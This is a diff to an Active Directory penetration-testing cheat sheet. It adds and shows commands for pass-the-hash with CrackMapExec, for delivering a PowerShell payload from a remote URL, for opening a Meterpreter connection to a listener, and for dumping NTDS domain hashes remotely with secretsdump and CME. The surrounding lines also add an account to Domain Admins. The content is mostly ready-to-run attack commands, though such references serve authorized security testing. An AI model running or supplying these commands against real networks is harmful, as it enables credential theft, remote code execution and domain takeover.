@@ -21,7 +21,6 @@
 
 
 ## Tools
-
 * [Impacket](https://github.com/CoreSecurity/impacket) or the [Windows version](https://github.com/maaaaz/impacket-examples-windows)
 * [Responder](https://github.com/SpiderLabs/Responder)
 * [Mimikatz](https://github.com/gentilkiwi/mimikatz)
@@ -33,6 +32,7 @@
 git clone --recursive https://github.com/byt3bl33d3r/CrackMapExec
 crackmapexec 192.168.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f --shares
 crackmapexec 192.168.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f -M metinject -o LHOST=192.168.1.63 LPORT=4443
+crackmapexec 192.168.1.100 -u Jaddmon -H ":5858d47a41e40b40f294b3100bea611f" -M web_delivery -o URL="https://IP:PORT/posh-payload"
 ```
 * [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
 ```powershell
@@ -128,6 +128,10 @@ then you need to use secretsdump to extract the hashes
 ```c
 secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
 ```
+secretsdump also works remotely
+```c
+./secretsdump.py IP administrator@domain -use-vss
+```
 
 
 **Alternatives - modules**    
@@ -139,6 +143,11 @@ windows/gather/credentials/domain_hashdump
 PowerSploit module
 ```
 Invoke-NinjaCopy --path c:\windows\NTDS\ntds.dit --verbose --localdestination c:\ntds.dit
+```
+
+CrackMapExec module
+```bash
+cme smb 10.10.0.202 -u username -p password --ntds vss
 ```
 
 ## Password in AD User comment
@@ -294,6 +303,7 @@ net group "Domain Admins" hacker2 /add /domain
  * [Top Five Ways I Got Domain Admin on Your Internal Network before Lunch (2018 Edition) - Adam Toscher](https://medium.com/@adam.toscher/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa)
  * [Finding Passwords in SYSVOL & Exploiting Group Policy Preferences](https://adsecurity.org/?p=2288)
  * [Golden ticket - Pentestlab](https://pentestlab.blog/2018/04/09/golden-ticket/)
+ * [Dumping Domain Password Hashes - Pentestlab](https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/)
  * [Getting the goods with CrackMapExec: Part 1, by byt3bl33d3r](https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-1.html)
  * [Getting the goods with CrackMapExec: Part 2, by byt3bl33d3r ](https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-2.html)
  * [Domain Penetration Testing: Using BloodHound, Crackmapexec, & Mimikatz to get Domain Admin](https://hausec.com/2017/10/21/domain-penetration-testing-using-bloodhound-crackmapexec-mimikatz-to-get-domain-admin/)
